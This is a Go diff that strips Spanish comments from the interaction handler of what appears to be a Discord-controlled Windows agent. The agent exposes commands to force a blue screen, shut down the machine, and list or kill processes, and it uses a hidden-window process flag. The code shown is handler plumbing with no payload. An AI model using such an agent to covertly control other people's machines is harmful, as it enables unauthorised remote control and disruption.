@@ -20,8 +20,6 @@ import (
 const createNoWindow = 0x08000000
 
 func interactionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
-	// Un panic en cualquier comando mataba el proceso y dejaba el bot mudo
-	// hasta el siguiente arranque de Windows. Se captura y se sigue vivo.
 	defer func() {
 		if recovered := recover(); recovered != nil {
 			slog.Error("panic en interacción", "tipo", i.Type, "panic", recovered, "stack", string(debug.Stack()))
@@ -33,18 +31,9 @@ func interactionHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
 
 	session := currentSession()
 	if session == nil {
-		// Sin sesión no hay panel ni canal: se acusa igual, porque una
-		// interacción sin respuesta deja "La aplicación no respondió" y el
-		// operador no sabe si el agente está vivo.
 		_ = commands.Reply(s, i, "⚠️ El agente no tiene sesión activa todavía.")
 		return
 	}
-
-	// Antes se exigía que el canal fuera exactamente el de la sesión. Ese
-	// filtro silencioso hacía que un clic en un panel viejo, o un comando
-	// escrito en otro canal, no contestara nunca. Ahora se atiende en
-	// cualquier canal de la guild; los custom_id del panel son únicos y cada
-	// cliente es su propia aplicación, así que no hay cruce entre agentes.
 
 	switch i.Type {
 	case discordgo.InteractionApplicationCommand:
@@ -93,8 +82,6 @@ func handleCommand(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	case "bsod":
 		commands.BSOD(s, i)
 	default:
-		// Un comando sin handler deja la interacción colgada hasta que Discord
-		// pinta "La aplicación no respondió".
 		_ = commands.Reply(s, i, "⚠️ Comando sin manejador: `"+i.ApplicationCommandData().Name+"`.")
 	}
 }
@@ -172,8 +159,6 @@ func handleModal(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		}
 		commands.Shutdown(s, i)
 	default:
-		// Un modal sin handler deja la interacción sin acuse y Discord pinta
-		// "La aplicación no respondió". Mejor cerrarla con un aviso.
 		_ = commands.Reply(s, i, "⚠️ Modal desconocido: `"+data.CustomID+"`.")
 	}
 }
@@ -267,12 +252,10 @@ func forceReconnect(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	}()
 }
 
-// formatSessionName centraliza el nombre visible de la sesión.
 func formatSessionName(num int) string {
 	return fmt.Sprintf("sesion-%d", num)
 }
 
-// parsePID extrae el PID del CustomID de un botón btn_pskill_<pid>.
 func parsePID(customID string) (uint32, error) {
 	raw := strings.TrimPrefix(customID, "btn_pskill_")
 	pid, err := strconv.ParseUint(raw, 10, 32)
@@ -285,8 +268,6 @@ func parsePID(customID string) (uint32, error) {
 	return uint32(pid), nil
 }
 
-// parsePage extrae el número de página de btn_ps_page_<n>. Las páginas
-// negativas se rechazan aquí; el comando las acota después.
 func parsePage(customID string) (int, error) {
 	raw := strings.TrimPrefix(customID, "btn_ps_page_")
 	page, err := strconv.Atoi(raw)
